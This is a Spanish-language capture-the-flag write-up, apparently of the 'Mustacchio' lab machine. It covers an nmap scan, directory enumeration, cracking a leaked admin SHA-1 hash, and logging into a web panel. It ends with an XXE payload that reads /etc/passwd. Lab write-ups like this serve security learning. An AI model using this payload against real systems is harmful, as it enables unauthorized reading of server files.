### nmap 
```python
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-11 20:34 EST
Nmap scan report for 10.10.163.196
Host is up (0.23s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 152.04 seconds
```
tenemos un archivo robots.txt
### Ports: 22/ssh - 80/http - 8765/http 

### Enumeracion del puerto 80
![[Pasted image 20231211214708.png]]
### parece que no hay mucha cosa interesante veamos el archivo robots.txt
![[Pasted image 20231211215451.png]]
parece que el archivo esta vacio
###  gobuster
![[Pasted image 20231211215631.png]]
gobuster nos certifica que existe el archivo robots.txt aparte de esto de todos los subdirectorios el mas llamativo es custom
### subdirectorio custom/js
![[Pasted image 20231211215353.png]]
### el archivo users.bak lo podemos descargar 
![[Pasted image 20231211220112.png]]
parece que tenemos un usuario admin con un hash asi que vamos a decodearlo

### usamos hashid para identificar el hash
![[Pasted image 20231211220355.png]]
buscamos un decoder de hash SHA-1
### tenemos un usuario y ahora una pass
![[Pasted image 20231211220902.png]]
### iniciamos session cn el panel de login
![[Pasted image 20231211222507.png]]
### parece que el panel de comandos no es vulnerable a reverse shell ni inyeccion sql
### miramos el codigo fuente
![[Pasted image 20231211222616.png]]
### parece que aqui nos dejan una pista asi que vamos a mirar este subdirectorio
### se nos descarga un archivo automaticamente y lo abrimos con strings 
parece que tenemos un archivo xml
![[Pasted image 20231211222919.png]]
### xml inyection 
usaremos esta xml inyeccion para intentar mirar el etc/passwd
```python
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]> 
<comment> 
<name>Joe Hamd</name> 
<author>Barry Clad</author> 
<com>&test; </com> 
</comment>
```
